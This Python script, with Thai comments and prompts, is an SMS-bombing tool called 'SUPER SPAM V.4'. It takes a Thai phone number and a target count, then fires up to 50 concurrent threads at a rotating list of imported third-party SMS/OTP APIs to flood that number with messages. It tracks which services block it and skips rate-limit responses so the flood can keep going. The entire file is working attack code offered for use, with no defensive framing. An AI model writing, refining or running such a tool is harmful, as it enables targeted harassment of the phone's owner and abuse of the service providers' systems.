# program/SMS-Super.py
import requests
import threading
import time
import sys
import random
from API_LIST import API_CONFIG 

# ==========================================
# 🎨 ตั้งค่าสี (Color System)
# ==========================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_WHITE = Fore.WHITE + Style.DIM   # เพิ่มสีขาวเข้ามาแล้ว
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_WHITE = C_RESET = ""

# ==========================================
# ตั้งค่าความแรง
# ==========================================
MAX_THREADS = 50   
TIMEOUT_SEC = 8     # เพิ่มเวลา Timeout ให้โอกาสเน็ตช้าบ้าง
MAX_RETRIES = 3     # ให้โอกาสผิดพลาดได้กี่ครั้งก่อนแบน

lock = threading.Lock()
success_total = 0

# เก็บสถานะ API: {api_name: fail_count}
api_fail_counts = {k: 0 for k in API_CONFIG.keys()}
banned_apis = set()

def clean_phone(phone):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): return "0" + phone[2:]
    if phone.startswith("+66"): return "0" + phone[3:]
    return phone

def shoot_api(phone, api_key):
    global success_total
    
    # ถ้าโดนแบนไปแล้ว ไม่ต้องยิง
    if api_key in banned_apis: return

    cfg = API_CONFIG.get(api_key)
    if not cfg: return

    try:
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        kwargs = {"headers": headers, "timeout": TIMEOUT_SEC}
        if isinstance(data_input, dict): kwargs["json"] = data_input
        elif isinstance(data_input, str): kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        
        # --- LOGIC วิเคราะห์ผลแบบฉลาด ---
        is_success = False
        should_ban = False
        
        # 1. เช็คความสำเร็จ
        if cfg.get("success_check"):
            if cfg["success_check"](response.text):
                is_success = True
        else:
            # Fallback ถ้าไม่มีตัวเช็ค
            if response.status_code in (200, 201) and "error" not in response.text.lower():
                is_success = True

        if is_success:
            with lock:
                success_total += 1
                # รีเซ็ตแต้มเสียเมื่อทำสำเร็จ
                api_fail_counts[api_key] = 0
                print(f"{C_GREEN}✅ ส่งสำเร็จ ({success_total}) | API: {cfg['name']}{C_RESET}")
        
        else:
            # ถ้าไม่สำเร็จ มาดูสาเหตุ
            status = response.status_code
            
            # กรณีที่ "ห้ามแบน" (แค่พัก)
            if status == 429: # ยิงถี่ไป
                return # จบรอบนี้เฉยๆ ไม่นับแต้มเสีย
            
            # กรณีที่ "แบนทันที" (ร้ายแรง)
            if status in (403, 401): # โดนบล็อก IP / Token ตาย
                should_ban = True
            
            # กรณีอื่นๆ (500, 400, 404) -> นับแต้มเสีย
            else:
                with lock:
                    api_fail_counts[api_key] += 1
                    if api_fail_counts[api_key] >= MAX_RETRIES:
                        should_ban = True

            if should_ban:
                with lock:
                    if api_key not in banned_apis:
                        print(f"{C_RED}💀 API {cfg['name']} ตายจริง (Status {status}) -> ตัดทิ้ง!{C_RESET}")
                        banned_apis.add(api_key)

    except Exception:
        # กรณี Network Error / Timeout -> นับแต้มเสีย
        with lock:
            api_fail_counts[api_key] += 1
            if api_fail_counts[api_key] >= MAX_RETRIES:
                if api_key not in banned_apis:
                    print(f"{C_RED}💀 API {cfg['name']} เชื่อมต่อไม่ได้เกิน {MAX_RETRIES} ครั้ง -> ตัดทิ้ง!{C_RESET}")
                    banned_apis.add(api_key)

def start_super_spam(phone, target_amount):
    print(f"\n{C_CYAN}🚀 SUPER SPAM V.4 (Smart Logic) ไปที่: {phone}{C_RESET}")
    print(f"{C_CYAN}🎯 เป้าหมายความสำเร็จ: {target_amount} ครั้ง{C_RESET}")
    print(f"{C_WHITE}💡 ระบบจะตัด API ทิ้งเมื่อพลาดติดต่อกัน {MAX_RETRIES} ครั้งเท่านั้น{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

    all_api_keys = list(API_CONFIG.keys())
    threads = []
    attempt_count = 0 
    
    while success_total < target_amount:
        # เลือกเฉพาะ API ที่ยังไม่โดนแบน
        active_apis = [k for k in all_api_keys if k not in banned_apis]
        
        if not active_apis:
            print(f"\n{C_RED}❌ ไม่มี API ที่ใช้งานได้เหลืออยู่เลย! (โดนแบนหมด){C_RESET}")
            break

        # วนใช้ API
        api_key = active_apis[attempt_count % len(active_apis)]
        
        # สร้าง Thread ยิง
        t = threading.Thread(target=shoot_api, args=(phone, api_key))
        threads.append(t)
        t.start()
        attempt_count += 1

        # คุมจำนวน Thread ไม่ให้เครื่องค้าง
        threads = [t for t in threads if t.is_alive()]
        while len(threads) >= MAX_THREADS:
            time.sleep(0.05)
            threads = [t for t in threads if t.is_alive()]
        
        time.sleep(0.01)

    # รอ Thread ที่เหลือทำงานให้จบ
    for t in threads: t.join()

    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")
    print(f"{C_GREEN}🏁 ภารกิจเสร็จสิ้น!{C_RESET}")
    print(f"✅ ยอดสำเร็จ: {C_GREEN}{success_total}/{target_amount}{C_RESET}")
    print(f"🔁 ยิงไปทั้งหมด: {attempt_count} ครั้ง")
    print(f"💀 API ที่ตายถาวร: {C_RED}{len(banned_apis)}{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

if __name__ == "__main__":
    try:
        phone_input = input(f"{C_YELLOW}📱 เบอร์โทรศัพท์: {C_RESET}")
        clean_p = clean_phone(phone_input)
        
        if len(clean_p) != 10:
            print(f"{C_RED}❌ เบอร์ไม่ถูกต้อง{C_RESET}")
            sys.exit()

        amount_input = input(f"{C_YELLOW}🔢 จำนวนความสำเร็จที่ต้องการ: {C_RESET}")
        amount = int(amount_input)

        start_super_spam(clean_p, amount)
        
    except ValueError:
        print(f"{C_RED}❌ ใส่ตัวเลขเท่านั้น{C_RESET}")
    except KeyboardInterrupt:
        print(f"\n{C_RED}⛔ ยกเลิก{C_RESET}")
